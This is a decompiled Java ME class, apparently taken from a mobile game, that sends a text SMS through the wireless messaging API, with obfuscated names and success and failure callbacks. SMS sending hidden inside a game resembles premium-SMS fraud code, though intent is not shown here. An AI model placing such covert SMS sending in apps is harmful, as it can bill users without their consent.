import javax.wireless.messaging.Message;
import javax.microedition.io.Connector;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

// 
// Decompiled by Procyon v0.5.36
// 

final class Game102 implements Runnable
{
    private final String Class1;
    private final String Class2;
    private final String Class3;
    private final Command Class4;
    private final Command Class5;
    
    Game102(final String class1, final String class2, final String class3, final Command class4, final Command class5) {
        this.Class1 = class1;
        this.Class2 = class2;
        this.Class3 = class3;
        this.Class4 = class4;
        this.Class5 = class5;
    }
    
    public final void run() {
        try {
            final MessageConnection messageConnection;
            final TextMessage textMessage;
            ((Message)(textMessage = (TextMessage)(messageConnection = (MessageConnection)Connector.open(this.Class1)).newMessage("text"))).setAddress(this.Class1);
            textMessage.setPayloadText(this.Class2);
            messageConnection.send((Message)textMessage);
            System.out.println("SMS data: " + this.Class2 + ", to: " + this.Class3);
            this.Class4.Class1();
        }
        catch (Exception ex) {
            this.Class5.Class1();
        }
    }
}
